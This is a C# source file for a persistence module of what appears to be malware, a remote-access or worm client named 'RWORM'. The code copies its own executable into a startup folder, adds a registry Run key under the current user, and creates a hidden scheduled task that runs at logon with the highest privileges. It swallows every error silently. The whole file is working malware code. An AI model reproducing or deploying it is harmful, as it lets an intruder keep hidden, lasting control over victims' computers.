using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class Persistence
    {
        public static void Install()
        {
            if (!Config.StartupRegistry && !Config.SchTasks) return;

            try
            {
                var currentExe = Environment.ProcessPath;
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                {
                    currentExe = Process.GetCurrentProcess().MainModule?.FileName;
                }
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe)) return;

                string targetPath = currentExe;

                // Copy to startup directory if configured and not already running from there
                if (!string.IsNullOrWhiteSpace(Config.StartupPath))
                {
                    try
                    {
                        var expandedDir = Environment.ExpandEnvironmentVariables(Config.StartupPath);
                        Directory.CreateDirectory(expandedDir);
                        var destExe = Path.Combine(expandedDir, Path.GetFileName(currentExe));
                        if (!string.Equals(currentExe, destExe, StringComparison.OrdinalIgnoreCase))
                        {
                            File.Copy(currentExe, destExe, true);
                            targetPath = destExe;
                        }
                    }
                    catch { }
                }

                // Registry Run Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
                if (Config.StartupRegistry)
                {
                    try
                    {
                        using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                        key?.SetValue("RWORM", $"\"{targetPath}\"");
                    }
                    catch { }
                }

                // Scheduled Tasks (SCHTASKS on user logon)
                if (Config.SchTasks)
                {
                    try
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName        = "schtasks.exe",
                            Arguments       = $"/create /tn \"RWORM_Startup\" /tr \"\\\"{targetPath}\\\"\" /sc onlogon /f /rl highest",
                            UseShellExecute = false,
                            CreateNoWindow  = true,
                            WindowStyle     = ProcessWindowStyle.Hidden
                        };
                        using var proc = Process.Start(psi);
                        proc?.WaitForExit(4000);
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
